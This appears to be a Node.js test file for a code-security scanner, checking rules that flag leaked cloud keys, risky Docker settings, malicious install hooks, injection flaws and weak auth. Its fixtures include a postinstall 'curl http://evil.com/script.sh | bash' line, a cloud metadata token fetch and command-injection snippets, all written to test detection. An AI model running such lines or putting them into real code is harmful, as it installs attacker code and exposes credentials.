// simplebeacon-ignore: Security rule tests — all findings are expected test fixtures
/**
 * Tests for the 10 advanced security rules ported from the browser scanner:
 * - SB-SEC-014: GCP Service Account Key
 * - SB-SEC-015: Azure Storage Key
 * - SB-SEC-016: OAuth Token in Source
 * - SB-SEC-017: Docker Privileged Mode
 * - SB-SEC-018: Docker Root User
 * - SB-SEC-019: Docker Exposed Secrets
 * - SB-SEC-020: Docker Missing Health Check
 * - SB-SEC-021: Suspicious Package Install
 * - SB-SEC-022: Malicious postinstall Script
 * - SB-SEC-023: Unpinned Dependency Version
 */

const { test, describe } = require("node:test");
const assert = require("node:assert/strict");
const {
  scanSecurityPatterns,
  SECURITY_RULES,
} = require("../src/rules/security-pattern-scanner");

function findIssue(issues, ruleId) {
  return issues.find((i) => i.id.startsWith(ruleId + "-"));
}

describe("Advanced Security Rules (SB-SEC-014 through SB-SEC-023)", () => {
  // === SB-SEC-014: GCP Service Account Key ===
  test("SB-SEC-014 flags GCP service account JSON", () => {
    const content = '{"type": "service_account", "project_id": "my-project"}';
    const issues = scanSecurityPatterns(
      "config/gcp-key.json",
      content,
      ".json",
    );
    assert.ok(
      findIssue(issues, "SB-SEC-014"),
      "Should flag GCP service account type",
    );
  });

  test("SB-SEC-014 flags GCP private key in source", () => {
    const content = 'const key = "private_key": "-----BEGIN PRIVATE KEY-----';
    const issues = scanSecurityPatterns("src/gcp-auth.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-014"), "Should flag GCP private key");
  });

  test("SB-SEC-014 flags GOOGLE_APPLICATION_CREDENTIALS env var", () => {
    const content = 'GOOGLE_APPLICATION_CREDENTIALS="/path/to/key.json"';
    const issues = scanSecurityPatterns("config/env.sh", content, ".sh");
    assert.ok(
      findIssue(issues, "SB-SEC-014"),
      "Should flag GCP credentials env var",
    );
  });

  test("SB-SEC-014 flags test fixtures on the quality lane, not as production", () => {
    const content = '{"type": "service_account", "project_id": "test"}';
    const issues = scanSecurityPatterns(
      "test/fixtures/gcp-key.json",
      content,
      ".json",
    );
    const hit = findIssue(issues, "SB-SEC-014");
    assert.ok(hit, "Should still record the fixture finding");
    assert.equal(hit.lane, "quality");
    assert.equal(hit.cwe, "CWE-798");
  });

  // === SB-SEC-015: Azure Storage Key ===
  test("SB-SEC-015 flags Azure AccountKey", () => {
    const content = "AccountKey=" + "A".repeat(88);
    const issues = scanSecurityPatterns("config/azure.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-015"), "Should flag Azure AccountKey");
  });

  test("SB-SEC-015 flags AZURE_CLIENT_SECRET", () => {
    const content =
      'AZURE_CLIENT_SECRET="my-azure-client-secret-value-1234567890"';
    const issues = scanSecurityPatterns("config/azure.env", content, ".env");
    assert.ok(
      findIssue(issues, "SB-SEC-015"),
      "Should flag Azure client secret",
    );
  });

  test("SB-SEC-015 flags test fixtures on the quality lane", () => {
    const content = "AccountKey=" + "A".repeat(88);
    const issues = scanSecurityPatterns(
      "test/fixtures/azure.json",
      content,
      ".json",
    );
    const hit = findIssue(issues, "SB-SEC-015");
    assert.ok(hit, "Should still record the fixture finding");
    assert.equal(hit.lane, "quality");
  });

  // === SB-SEC-016: OAuth Token in Source ===
  test("SB-SEC-016 flags Google OAuth token (ya29.)", () => {
    const content = "access_token = 'ya29.a0ARrdaM-abcdefghijklmnopqrstuvwxyz'";
    const issues = scanSecurityPatterns("src/auth.js", content, ".js");
    assert.ok(
      findIssue(issues, "SB-SEC-016"),
      "Should flag Google OAuth token",
    );
  });

  test("SB-SEC-016 flags Slack OAuth token (xoxb-)", () => {
    const content = 'oauth_token: "xoxb-1234567890-abcdefghijklmnopqrstuvwxyz"';
    const issues = scanSecurityPatterns("src/slack.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-016"), "Should flag Slack OAuth token");
  });

  test("SB-SEC-016 flags spec files on the quality lane", () => {
    const content = "access_token = 'ya29.a0ARrdaM-abcdefghijklmnopqrstuvwxyz'";
    const issues = scanSecurityPatterns("test/auth.spec.js", content, ".js");
    const hit = findIssue(issues, "SB-SEC-016");
    assert.ok(hit, "Should still record the spec finding");
    assert.equal(hit.lane, "quality");
  });

  // === SB-SEC-017: Docker Privileged Mode ===
  test("SB-SEC-017 flags privileged: true in docker-compose", () => {
    const content = "services:\n  app:\n    privileged: true";
    const issues = scanSecurityPatterns("docker-compose.yml", content, ".yaml");
    assert.ok(findIssue(issues, "SB-SEC-017"), "Should flag privileged mode");
  });

  test("SB-SEC-017 flags --privileged flag", () => {
    const content = "docker run --privileged myapp";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(findIssue(issues, "SB-SEC-017"), "Should flag --privileged flag");
  });

  test("SB-SEC-017 does not flag non-Docker files", () => {
    const content = "privileged: true";
    const issues = scanSecurityPatterns("src/config.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-017"),
      "Should NOT flag non-Docker file",
    );
  });

  // === SB-SEC-018: Docker Root User ===
  test("SB-SEC-018 flags USER root in Dockerfile", () => {
    const content = "FROM node:18\nUSER root\nWORKDIR /app";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(findIssue(issues, "SB-SEC-018"), "Should flag USER root");
  });

  test("SB-SEC-018 does not flag non-root user", () => {
    const content = "FROM node:18\nUSER node\nWORKDIR /app";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(!findIssue(issues, "SB-SEC-018"), "Should NOT flag USER node");
  });

  test("SB-SEC-018 does not flag non-Docker files", () => {
    const content = "USER root";
    const issues = scanSecurityPatterns("src/config.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-018"),
      "Should NOT flag non-Docker file",
    );
  });

  // === SB-SEC-019: Docker Exposed Secrets ===
  test("SB-SEC-019 flags hardcoded SECRET in Docker ENV", () => {
    const content = "ENV JWT_SECRET=mysecretvalue123";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      findIssue(issues, "SB-SEC-019"),
      "Should flag hardcoded secret in ENV",
    );
  });

  test("SB-SEC-019 flags hardcoded PASSWORD in Docker ENV", () => {
    const content = "ENV DB_PASSWORD=supersecret123";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      findIssue(issues, "SB-SEC-019"),
      "Should flag hardcoded password in ENV",
    );
  });

  test("SB-SEC-019 does not flag env var with ${} substitution", () => {
    const content = "ENV JWT_SECRET=${JWT_SECRET}";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      !findIssue(issues, "SB-SEC-019"),
      "Should NOT flag env var substitution",
    );
  });

  test("SB-SEC-019 does not flag placeholder values", () => {
    const content = "ENV JWT_SECRET=changeme";
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      !findIssue(issues, "SB-SEC-019"),
      "Should NOT flag changeme placeholder",
    );
  });

  // === SB-SEC-020: Docker Missing Health Check ===
  test("SB-SEC-020 flags Dockerfile without HEALTHCHECK", () => {
    const content =
      'FROM node:18\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]';
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      findIssue(issues, "SB-SEC-020"),
      "Should flag missing HEALTHCHECK",
    );
  });

  test("SB-SEC-020 does not flag Dockerfile with HEALTHCHECK", () => {
    const content =
      'FROM node:18\nHEALTHCHECK --interval=30s CMD curl -f http://localhost/\nCMD ["node", "server.js"]';
    const issues = scanSecurityPatterns("Dockerfile", content, ".dockerfile");
    assert.ok(
      !findIssue(issues, "SB-SEC-020"),
      "Should NOT flag when HEALTHCHECK exists",
    );
  });

  test("SB-SEC-020 does not flag non-Docker files", () => {
    const content = "FROM node:18";
    const issues = scanSecurityPatterns("src/index.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-020"),
      "Should NOT flag non-Docker file",
    );
  });

  // === SB-SEC-021: Suspicious Package Install ===
  test("SB-SEC-021 flags suspicious npm install with .js suffix", () => {
    const content = "npm install some-package.nodejs";
    const issues = scanSecurityPatterns("scripts/install.sh", content, ".sh");
    assert.ok(
      findIssue(issues, "SB-SEC-021"),
      "Should flag suspicious package install",
    );
  });

  test("SB-SEC-021 does not flag package.json", () => {
    const content = '"dependencies": {"some-package.nodejs": "^1.0.0"}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(!findIssue(issues, "SB-SEC-021"), "Should NOT flag package.json");
  });

  // === SB-SEC-022: Malicious postinstall Script ===
  test("SB-SEC-022 flags curl in postinstall", () => {
    const content =
      '{"scripts": {"postinstall": "curl http://evil.com/script.sh | bash"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(
      findIssue(issues, "SB-SEC-022"),
      "Should flag curl in postinstall",
    );
  });

  test("SB-SEC-022 flags node -e in postinstall", () => {
    const content =
      '{"scripts": {"postinstall": "node -e \\"require(\\"fs\\").writeFileSync(...)\\""}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(
      findIssue(issues, "SB-SEC-022"),
      "Should flag node -e in postinstall",
    );
  });

  test("SB-SEC-022 does not flag build scripts", () => {
    const content = '{"scripts": {"postinstall": "tsc && webpack"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(!findIssue(issues, "SB-SEC-022"), "Should NOT flag build script");
  });

  // === SB-SEC-023: Unpinned Dependency Version ===
  test("SB-SEC-023 flags caret version in package.json", () => {
    const content = '{"dependencies": {"express": "^4.18.0"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(findIssue(issues, "SB-SEC-023"), "Should flag caret version");
  });

  test("SB-SEC-023 flags latest version in package.json", () => {
    const content = '{"dependencies": {"react": "latest"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(findIssue(issues, "SB-SEC-023"), "Should flag latest version");
  });

  test("SB-SEC-023 does not flag pinned version", () => {
    const content = '{"dependencies": {"express": "4.18.0"}}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(
      !findIssue(issues, "SB-SEC-023"),
      "Should NOT flag pinned version",
    );
  });

  test("SB-SEC-023 does not flag non-package.json files", () => {
    const content = '{"dependencies": {"express": "^4.18.0"}}';
    const issues = scanSecurityPatterns("src/config.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-023"),
      "Should NOT flag non-package.json file",
    );
  });

  test("SB-SEC-024 flags GCP impersonation IAM role", () => {
    const content = 'member = "roles/iam.serviceAccountTokenCreator"';
    const issues = scanSecurityPatterns("infra/iam.tf", content, ".tf");
    assert.ok(findIssue(issues, "SB-SEC-024"), "Should flag TokenCreator");
  });

  test("SB-SEC-025 flags allUsers IAM member", () => {
    const content = 'members = ["allUsers"]';
    const issues = scanSecurityPatterns("infra/policy.yaml", content, ".yaml");
    assert.ok(findIssue(issues, "SB-SEC-025"), "Should flag allUsers");
  });

  test("SB-SEC-026 flags interpolated execSync", () => {
    const content = "child_process.execSync(`ls ${req.query.path}`)";
    const issues = scanSecurityPatterns("src/api.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-026"), "Should flag command injection");
  });

  test("SB-SEC-027 flags curl pipe to bash", () => {
    const content = "curl https://example.com/install.sh | bash";
    const issues = scanSecurityPatterns("ci/setup.sh", content, ".sh");
    assert.ok(findIssue(issues, "SB-SEC-027"), "Should flag curl|bash");
  });

  test("SB-SEC-028 flags LLM shell tool wiring", () => {
    const content = "const tools = { run_shell_command: execSync }";
    const issues = scanSecurityPatterns("src/agent.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-028"), "Should flag agent shell tool");
  });

  test("SB-SEC-029 flags nodeIntegration true", () => {
    const content = "new BrowserWindow({ nodeIntegration: true })";
    const issues = scanSecurityPatterns("src/main.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-029"), "Should flag sandbox disable");
  });

  test("SB-SEC-030 flags GCE metadata token URL", () => {
    const content =
      'fetch("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token")';
    const issues = scanSecurityPatterns("src/gcp.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-030"), "Should flag IMDS token fetch");
  });

  test("SB-SEC-031 flags pickle.loads", () => {
    const content = "data = pickle.loads(body)";
    const issues = scanSecurityPatterns("src/ingest.py", content, ".py");
    assert.ok(findIssue(issues, "SB-SEC-031"), "Should flag pickle.loads");
  });

  test("SB-SEC-031 does not flag yaml SafeLoader", () => {
    const content = "yaml.load(doc, Loader=yaml.SafeLoader)";
    const issues = scanSecurityPatterns("src/cfg.py", content, ".py");
    assert.ok(
      !findIssue(issues, "SB-SEC-031"),
      "Should NOT flag SafeLoader yaml.load",
    );
  });

  test("SB-SEC-032 flags interpolated SQL", () => {
    const content = 'db.query(f"SELECT * FROM users WHERE id={user_id}")';
    const issues = scanSecurityPatterns("src/db.py", content, ".py");
    assert.ok(findIssue(issues, "SB-SEC-032"), "Should flag SQL concat");
  });

  test("SB-SEC-033 flags findById(req.params)", () => {
    const content = "User.findById(req.params.id)";
    const issues = scanSecurityPatterns("src/routes.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-033"), "Should flag IDOR lookup");
  });

  test("SB-SEC-034 flags httpOnly false cookie", () => {
    const content = "cookie: { httpOnly: false, maxAge: 86400 }";
    const issues = scanSecurityPatterns("src/session.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-034"), "Should flag insecure cookie");
  });

  test("SB-SEC-035 flags AGPL in package.json", () => {
    const content = '{"name":"x","license":"AGPL-3.0"}';
    const issues = scanSecurityPatterns("package.json", content, ".json");
    assert.ok(findIssue(issues, "SB-SEC-035"), "Should flag AGPL");
  });

  test("SB-SEC-036 flags log4j-core in pom.xml", () => {
    const content =
      "<dependency><artifactId>log4j-core</artifactId></dependency>";
    const issues = scanSecurityPatterns("pom.xml", content, ".xml");
    assert.ok(findIssue(issues, "SB-SEC-036"), "Should flag log4j-core");
  });

  test("SB-SEC-037 flags BLOCK_NONE safety setting", () => {
    const content = "safety_settings: [{ threshold: BLOCK_NONE }]";
    const issues = scanSecurityPatterns("src/llm.js", content, ".js");
    assert.ok(
      findIssue(issues, "SB-SEC-037"),
      "Should flag disabled guardrail",
    );
  });

  test("SB-SEC-038 flags jwt.decode", () => {
    const content = "const payload = jwt.decode(token);";
    const issues = scanSecurityPatterns("src/auth.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-038"), "Should flag jwt.decode");
  });

  test("SB-SEC-039 flags redirect_uri from query", () => {
    const content = "redirect_uri: req.query.redirect_uri";
    const issues = scanSecurityPatterns("src/oauth.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-039"), "Should flag OAuth redirect");
  });

  test("SB-SEC-040 flags convert execFile", () => {
    const content = "execFile('convert', [upload.path, out])";
    const issues = scanSecurityPatterns("src/img.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-040"), "Should flag ImageMagick");
  });

  test("SB-SEC-041 flags multer without fileFilter", () => {
    const content = "multer({ dest: 'uploads/' })";
    const issues = scanSecurityPatterns("src/upload.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-041"), "Should flag open upload");
  });

  test("SB-SEC-042 flags md5 password hash", () => {
    const content = "crypto.createHash('md5').update(password).digest('hex')";
    const issues = scanSecurityPatterns("src/users.js", content, ".js");
    assert.ok(
      findIssue(issues, "SB-SEC-042"),
      "Should flag weak password hash",
    );
  });

  test("SB-SEC-043 flags skipPayment", () => {
    const content = "if (query.skipPayment) order.status = 'paid'";
    const issues = scanSecurityPatterns("src/checkout.js", content, ".js");
    assert.ok(findIssue(issues, "SB-SEC-043"), "Should flag payment skip");
  });

  // === Rule registration verification ===
  test("All 10 new rules are registered in SECURITY_RULES", () => {
    const newRuleIds = [
      "SB-SEC-014",
      "SB-SEC-015",
      "SB-SEC-016",
      "SB-SEC-017",
      "SB-SEC-018",
      "SB-SEC-019",
      "SB-SEC-020",
      "SB-SEC-021",
      "SB-SEC-022",
      "SB-SEC-023",
      "SB-SEC-024",
      "SB-SEC-025",
      "SB-SEC-026",
      "SB-SEC-027",
      "SB-SEC-028",
      "SB-SEC-029",
      "SB-SEC-030",
      "SB-SEC-031",
      "SB-SEC-032",
      "SB-SEC-033",
      "SB-SEC-034",
      "SB-SEC-035",
      "SB-SEC-036",
      "SB-SEC-037",
      "SB-SEC-038",
      "SB-SEC-039",
      "SB-SEC-040",
      "SB-SEC-041",
      "SB-SEC-042",
      "SB-SEC-043",
      "SB-SEC-044",
      "SB-SEC-045",
    ];
    for (const id of newRuleIds) {
      const rule = SECURITY_RULES.find((r) => r.id === id);
      assert.ok(rule, "Rule " + id + " should be registered");
      assert.ok(rule.regex, "Rule " + id + " should have a regex");
      assert.ok(rule.severity, "Rule " + id + " should have a severity");
      assert.ok(rule.description, "Rule " + id + " should have a description");
    }
  });

  test("New rules have correct severity levels", () => {
    const severities = {
      "SB-SEC-014": "critical",
      "SB-SEC-015": "critical",
      "SB-SEC-016": "high",
      "SB-SEC-017": "high",
      "SB-SEC-018": "medium",
      "SB-SEC-019": "critical",
      "SB-SEC-020": "low",
      "SB-SEC-021": "high",
      "SB-SEC-022": "high",
      "SB-SEC-023": "medium",
      "SB-SEC-024": "high",
      "SB-SEC-025": "high",
      "SB-SEC-026": "critical",
      "SB-SEC-027": "high",
      "SB-SEC-028": "high",
      "SB-SEC-029": "high",
      "SB-SEC-030": "high",
      "SB-SEC-031": "critical",
      "SB-SEC-032": "critical",
      "SB-SEC-033": "high",
      "SB-SEC-034": "high",
      "SB-SEC-035": "high",
      "SB-SEC-036": "high",
      "SB-SEC-037": "high",
      "SB-SEC-038": "critical",
      "SB-SEC-039": "high",
      "SB-SEC-040": "critical",
      "SB-SEC-041": "high",
      "SB-SEC-042": "critical",
      "SB-SEC-043": "high",
      "SB-SEC-044": "high",
      "SB-SEC-045": "high",
    };
    for (const [id, expectedSev] of Object.entries(severities)) {
      const rule = SECURITY_RULES.find((r) => r.id === id);
      assert.equal(
        rule.severity,
        expectedSev,
        "Rule " + id + " should have severity " + expectedSev,
      );
    }
  });

  test("SB-SEC-044 maps disabled TLS verify to CWE-295 on production paths", () => {
    const issues = scanSecurityPatterns(
      "src/app/api/client.py",
      "requests.get(url, verify=False)\n",
      ".py",
    );
    const hit = findIssue(issues, "SB-SEC-044");
    assert.ok(hit, "Should flag verify=False");
    assert.equal(hit.lane, "production");
    assert.equal(hit.cwe, "CWE-295");
    assert.equal(hit.owasp.includes("A02:2021"), true);
  });

  test("SB-SEC-044 on molecule/test paths is muted", () => {
    const issues = scanSecurityPatterns(
      "molecule/testinfra/test_tls.py",
      "requests.get(url, verify=False)\n",
      ".py",
    );
    assert.ok(
      !findIssue(issues, "SB-SEC-044"),
      "Production-only TLS rule should skip test/molecule paths",
    );
  });

  test("SB-SEC-031 mutes pickle in test folders", () => {
    const issues = scanSecurityPatterns(
      "tests/test_ingest.py",
      "data = pickle.loads(body)\n",
      ".py",
    );
    assert.ok(!findIssue(issues, "SB-SEC-031"));
  });

  test("SB-SEC-033 maps production IDOR lookup to CWE-862", () => {
    const issues = scanSecurityPatterns(
      "src/app/api/users.js",
      "User.findById(req.params.id)\n",
      ".js",
    );
    const hit = findIssue(issues, "SB-SEC-033");
    assert.ok(hit);
    assert.equal(hit.cwe, "CWE-862");
    assert.equal(hit.lane, "production");
  });

  test("SB-SEC-033 mutes test folder lookups", () => {
    const issues = scanSecurityPatterns(
      "test/routes.spec.js",
      "User.findById(req.params.id)\n",
      ".js",
    );
    assert.ok(!findIssue(issues, "SB-SEC-033"));
  });

  test("SB-SEC-033 mutes when tenant check is on the next lines", () => {
    const content = [
      "const rec = await User.findById(req.params.id);",
      "if (rec.tenantId !== req.user.tenantId) {",
      "  return res.status(403);",
      "}",
    ].join("\n");
    const issues = scanSecurityPatterns("src/routes.js", content, ".js");
    assert.ok(
      !findIssue(issues, "SB-SEC-033"),
      "Nearby req.user.tenantId should suppress the IDOR heuristic",
    );
  });

  test("SB-SEC-033 mutes when session id is checked just above the lookup", () => {
    const content = [
      "if (req.params.id !== req.user.id) return res.status(403);",
      "const rec = User.findById(req.params.id);",
    ].join("\n");
    const issues = scanSecurityPatterns("src/routes.js", content, ".js");
    assert.ok(!findIssue(issues, "SB-SEC-033"));
  });

  test("SB-SEC-033 mutes same-object tenant filter on findOne", () => {
    const content =
      "Order.findOne({ _id: req.params.id, tenantId: req.user.tenantId })";
    const issues = scanSecurityPatterns("src/orders.js", content, ".js");
    assert.ok(!findIssue(issues, "SB-SEC-033"));
  });

  test("SB-SEC-033 still flags when tenant check is far from the lookup", () => {
    const content = [
      "function assertTenant() { return req.user.tenantId; }",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "",
      "User.findById(req.params.id);",
    ].join("\n");
    const issues = scanSecurityPatterns("src/routes.js", content, ".js");
    assert.ok(
      findIssue(issues, "SB-SEC-033"),
      "A tenant token 10+ lines away must not suppress the finding",
    );
  });

  test("SB-SEC-045 flags wildcard CORS in production", () => {
    const issues = scanSecurityPatterns(
      "src/server.js",
      "app.use(cors({ origin: '*' }))\n",
      ".js",
    );
    const hit = findIssue(issues, "SB-SEC-045");
    assert.ok(hit);
    assert.equal(hit.cwe, "CWE-942");
  });
});
